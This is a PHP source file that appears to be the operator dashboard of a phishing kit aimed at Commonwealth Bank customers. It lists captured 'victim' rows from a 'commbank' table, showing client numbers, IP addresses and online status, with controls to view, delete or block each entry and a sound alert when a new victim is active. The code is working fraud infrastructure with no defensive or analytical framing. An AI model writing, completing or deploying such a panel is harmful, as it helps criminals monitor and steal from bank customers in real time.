<?php
require '../../database_setup/connection.php';
require '../php_functions/php_functions.php';

ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);

$query = mysqli_query($conn, "SELECT clientnumber, status, uniqueid, viewed, last_activity, ip, blocked FROM commbank");
$vic_rows = [];

if ($query) {
  while ($row = mysqli_fetch_assoc($query)) {
    $vic_rows[] = $row;
  }
}

// Track Alternate Rows
$counter = 0;

foreach ($vic_rows as $user) {
  $counter++;
  $username = $user["clientnumber"];
  $status = $user["status"];
  $uniqueid = $user["uniqueid"];
  $viewed = $user["viewed"];
  $last_activity = $user["last_activity"];
  $ip = $user["ip"];
  $blocked = $user["blocked"];

  $color = $blocked == 'false' ? "green" : "red";
  $flash = $viewed == 'false' ? "flashit" : "";
  $alternate_row = $counter % 2 == 1 ? "alternate-row" : false;

  $online = compare_time($last_activity) < 5 ? "Online" : "Offline";

  $element =  '
  <div class="table-row ' . $alternate_row . '">
    <div class="row ' . $flash . '">
      <div class="col-2">
        <span class="' . strtolower($online) . '-alert" id="' . $uniqueid . '-status">' . $online . '</span>
      </div>
      <div class="col-3">
        <span class="table-cell-text">' . status_match($status) . '</span>
      </div>
      <div class="col-2">
        <span class="table-cell-text">' . $username . '<br>' . $ip . '<br>' . date("h:i:s", $uniqueid) . '</span>
      </div>
      <div class="col-2">
        <button class="action-btn" onclick="window.open(\'action-view.php?id=' . $uniqueid . '\',\'_blank\')">Settings</button>
      </div>
      <div class="col-2">
        <button class="action-btn" style="background: red;" onclick="remove_row(' . $uniqueid . ')"><i class="fas fa-trash-alt"></i></button>
      </div>
      <div class="col-1">
        <button class="action-btn" style="background: ' . $color . '" onclick="block_ip(\'' . $ip . '\', \'' . $uniqueid .'\')"><i class="fas fa-ban"></i></button>
      </div>
    </div>
  </div>';

  if ($viewed == 'false' and compare_time($last_activity) < 5) {
    $element .= '
    <script>
    if (sound_enabled == true) {
      var audio = new Audio("sounds/notify.mp3");
      audio.play();
    }
    </script>';
  }

  echo $element;
}

?>
